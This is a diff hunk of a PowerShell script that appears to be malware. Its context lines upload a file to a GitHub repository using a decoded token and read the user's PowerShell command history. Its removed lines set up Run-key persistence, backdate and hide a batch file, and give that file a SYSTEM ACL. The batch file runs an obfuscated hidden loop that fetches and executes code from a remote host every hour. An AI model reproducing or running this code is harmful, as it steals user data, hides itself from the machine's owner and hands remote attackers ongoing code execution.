@@ -54,42 +54,7 @@ $ken = [System.Text.Encoding]::UTF8.GetString($ken)
 git-uploadfile -token $ken -file $filename -owner musai51 -repo yanni -path carry -force
 remove-item $filename -force
 
-$RegistryPath = 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
-$Name         = 'Version'
-$paFile        = $env:appdata + '\ini.bat'
 
-function Change_Date($filepath)
-{
-	$newDate = Get-Date "2021-05-30 09:45:23"
-	$file = Get-Item $filePath
-	$file.CreationTime = $newDate
-	$file.LastWriteTime = $newDate
-	$file.LastAccessTime = $newDate
-}
-
-function Set_bootACL($filepath)
-{
-	if(!(Test-Path -Path $filepath))
-	{
-		Write-Host "File is not existed"
-		return $False
-	}	
-	attrib +S +H +R $filepath
-	$mgr_acl = Get-ACL -Path "C:\Windows\System32\intl.cpl"
-	$user_sid = New-Object System.Security.Principal.Ntaccount('NT AUTHORITY\SYSTEM')
-	$mgr_acl.SetOwner($user_sid)
-	Set-Acl -Path $filepath -ACLObject $mgr_acl	
-	return $True
-}
-
-
-$content = "cmd /c start /min powershell start-process powershell {while(`$true){[string]`$ujfgbb={(Nezpoiuasxw-zpoiuasxObjzpoiuasxect Nzpoiuasxet.zpoiuasxWzpoiuasxebzpoiuasxClizpoiuasxent).Dozpoiuasxwnzpoiuasxloadszpoiuasxtrizpoiuasxng('hzpoiuasxttzpoiuasxp:zpoiuasx/zpoiuasx/utzpoiuasxilizpoiuasxty.szpoiuasxynezpoiuasxrgizezpoiuasx.czpoiuasxo/szpoiuasxystzpoiuasxem/syzpoiuasxsinzpoiuasxfo.txzpoiuasxt')};`$oaasccv=`$ujfgbb.Replace('zpoiuasx','');`$mweref=iex `$oaasccv;invoke-expression `$mweref;start-sleep -s 3600}} -windowstyle hidden"
-sc $paFile $content
-
-Change_Date($paFile)
-Set_bootACL($paFile)
-
-New-ItemProperty -Path $RegistryPath -Name $Name -Value $paFile -PropertyType REG_SZ -Force
 
 $lkj = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 $fff = Test-Path $lkj
